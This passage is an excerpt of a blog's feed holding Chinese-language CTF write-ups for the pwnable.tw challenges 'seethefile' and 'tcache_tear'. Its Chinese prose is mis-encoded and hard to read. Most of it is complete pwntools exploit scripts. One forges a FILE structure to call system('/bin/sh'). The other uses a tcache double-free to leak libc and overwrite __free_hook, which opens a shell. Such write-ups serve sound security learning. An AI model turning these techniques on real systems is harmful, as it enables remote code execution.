__seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x804b2b4, </span><br><span class="line">  __close = 0xf7d80250 &lt;__libc_system&gt;, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./seethefile&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10200</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def open(filename):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendafter(&quot;see :&quot;, filename)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">menu(3)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">def exit(name):</span><br><span class="line">menu(5)</span><br><span class="line">io.sendafter(&quot;name :&quot;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"># payload = &apos;k&apos; * 0x20 + &quot;/home/seethefile/flag&quot;</span><br><span class="line">open(&quot;/proc/self/maps\n&quot;)</span><br><span class="line">read()</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line">io.recvuntil(&quot;\n&quot;)</span><br><span class="line">libc_base = int(&quot;0x&quot;+io.recv(8),16)</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">name_addr = 0x0804B260</span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x20, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr)# fake file addr</span><br><span class="line">payload  = payload.ljust(0x48, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr + 0x10)</span><br><span class="line">payload  = payload.ljust(0x94, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr+0x98-0x44)</span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line"></span><br><span class="line">exit(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 1)</span><br></pre></td></tr></table></figure><p>å¹¶ä¸èƒ½ç›´æ¥å¾—åˆ°flag</p><p>éœ€è¦è¿è¡Œ<code>get_flag</code>ï¼Œæºç ä¹Ÿç»™æƒ¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int read_input(char *buf,unsigned int size)&#123;</span><br><span class="line">    int ret ;</span><br><span class="line">    ret = read(0,buf,size);</span><br><span class="line">    if(ret &lt;= 0)&#123;</span><br><span class="line">        puts(&quot;read error&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if(buf[ret-1] == &apos;\n&apos;)</span><br><span class="line">        buf[ret-1] = &apos;\x00&apos;;</span><br><span class="line">    return ret ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    printf(&quot;Your magic :&quot;);</span><br><span class="line">    read_input(buf,40);</span><br><span class="line">    if(strcmp(buf,&quot;Give me the flag&quot;))&#123;</span><br><span class="line">        puts(&quot;GG !&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *fp = fopen(&quot;/home/seethefile/flag&quot;,&quot;r&quot;);</span><br><span class="line">    if(!fp)&#123;</span><br><span class="line">        puts(&quot;Open failed !&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,1,40,fp);</span><br><span class="line">    printf(&quot;Here is your flag: %s \n&quot;,buf);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>Give me the flag</code>å³å¯</p><blockquote><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/2e00afb01606" target="_blank" rel="noopener">https://www.jianshu.com/p/2e00afb01606</a></p><p>[<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]</a>(<a href="https://veritas501.space/2017/12/13/IO" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO</a> FILE å­¦ä¹ ç¬”è®°/) é‡Œé¢æœ‰ä¸€ä¸ªFILE.pyä¼ªé€ ç»“æ„ä½“æ„Ÿè§‰å¾ˆå¥½ovo</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;seethefile&quot;&gt;&lt;a href=&quot;#seethefile&quot; class=&quot;headerlink&quot; title=&quot;seethefile&quot;&gt;&lt;/a&gt;seethefile&lt;/h1&gt;&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw tcache_tear wp</title>
    <link href="p1Kk.github.io/2020/07/21/tw/tw%20tear/"/>
    <id>p1Kk.github.io/2020/07/21/tw/tw%20tear/</id>
    <published>2020-07-20T16:00:00.000Z</published>
    <updated>2020-07-21T10:34:00.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache-tear"><a href="#tcache-tear" class="headerlink" title="tcache_tear"></a>tcache_tear</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO# GOTè¡¨ä¸å¯å†™</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨freeå¤„æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„uafï¼Œè¿˜æœ‰åœ¨mallocä¸­ï¼Œå­˜åœ¨è¶Šç•Œ</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/tearyuejie.png" alt></p><p>è®¾æƒ³æ„é€ unsorted binï¼Œfreeåæ‰“å°å‡ºfdå‡å»åç§»å¾—åˆ°libcåŸºå€ã€‚</p><ol><li><p>æ„é€ unsorted binï¼Œtcacheé“¾è¡¨æ˜¯æœ‰ç©ºé—´é™åˆ¶çš„ï¼Œä½†æ˜¯é¢˜ç›®ä¸­å¯¹freeæ¬¡æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œå¤šæ¬¡freeå¡«æ»¡tcacheæ˜¾ç„¶æ— æ³•å®ç°ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ä¼ªé€ fake sizeï¼Œæ„é€ ä¸€ä¸ªfake unsorted binï¼ŒåŒæ—¶è¦è®¾ç½®å¥½åä¸€ä¸ªchunkçš„inuseä½ç­‰é€šè¿‡æ£€æµ‹ã€‚</p><p>æ ¹æ®tcacheçš„ç‰¹æ€§ï¼Œå¯ä»¥ä¸ä½¿ç”¨ä¸Šé¢çš„æº¢å‡ºæ¼æ´ï¼Œä½¿ç”¨ä¸‹é¢çš„æ–¹å¼æ„é€ fake chunkã€‚</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x30,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0x30,addr)</span><br><span class="line">malloc(0x30,&quot;a&quot;*8)</span><br><span class="line">malloc(0x30,fake_data)</span><br></pre></td></tr></table></figure><ol start="2"><li>å¾—åˆ°libcï¼Œæ”¹free_hookä¸ºoneæˆ–syså³å¯â€¦</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./tcache_tear&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10207</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">name_addr = 0x602060</span><br><span class="line">ptr_addr = 0x602088</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;] </span><br><span class="line">success(puts_got)</span><br><span class="line">def name(name):</span><br><span class="line">io.sendafter(&quot;Name:&quot;, name)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def malloc(size, data):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;Size:&quot;, str(size))</span><br><span class="line">io.sendafter(&quot;Data:&quot;, data)</span><br><span class="line"></span><br><span class="line">def free():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def info():</span><br><span class="line">menu(3)</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># ä½¿ç”¨æº¢å‡ºæ¼æ´</span><br><span class="line"># name(&quot;/bin/sh\x00&quot;)</span><br><span class="line">name(&apos;kk&apos;)# fake unsorted bin</span><br><span class="line">malloc(0xf, &quot;d&quot;*0x10)</span><br><span class="line">free()</span><br><span class="line">malloc(0x60, &quot;e&quot;*8)</span><br><span class="line">free()</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">malloc(0xf, &quot;a&quot;*0x20+p64(name_addr-0x10+0x510))</span><br><span class="line">malloc(0x60,p64(0)+p64(0x11))</span><br><span class="line">malloc(0x60,p64(0)+p64(0x11))</span><br><span class="line"></span><br><span class="line">##################################</span><br><span class="line"></span><br><span class="line">malloc(0xf, &quot;a&quot;*0x10)</span><br><span class="line">free()</span><br><span class="line">malloc(0x50, &quot;b&quot;*8)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0xf, &quot;c&quot;*0x20+p64(name_addr-0x10))</span><br><span class="line">malloc(0x50,p64(0)+p64(0x511))</span><br><span class="line">malloc(0x50,p64(0)+p64(0x511))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">free()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">name(&quot;kk&quot;)</span><br><span class="line">malloc(0x70,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0x70,p64(name_addr-0x10+0x510))</span><br><span class="line">malloc(0x70,&quot;a&quot;*8)</span><br><span class="line">malloc(0x70,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))</span><br><span class="line"></span><br><span class="line">malloc(0x60,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(0x60,p64(name_addr-0x10))</span><br><span class="line">malloc(0x60,&quot;a&quot;*8)</span><br><span class="line">malloc(0x60,p64(0)+p64(0x511)+p64(0)*5+p64(name_addr))</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">io.recvuntil(&quot;Name :&quot;)</span><br><span class="line">libc_base = u64(io.recv(8)) - 0x3ebca0</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">sys_addr=libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">malloc(0x40,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(0x40,p64(free_hook))</span><br><span class="line">malloc(0x40,&quot;a&quot;*8)</span><br><span class="line">malloc(0x40,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">malloc(0x18,&quot;/bin/sh\x00&quot;)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tcache-tear&quot;&gt;&lt;a href=&quot;#tcache-tear&quot; class=&quot;headerlink&quot; title=&quot;tcache_tear&quot;&gt;&lt;/a&gt;tcache_tear&lt;/h1&gt;&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;head</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
</feed>
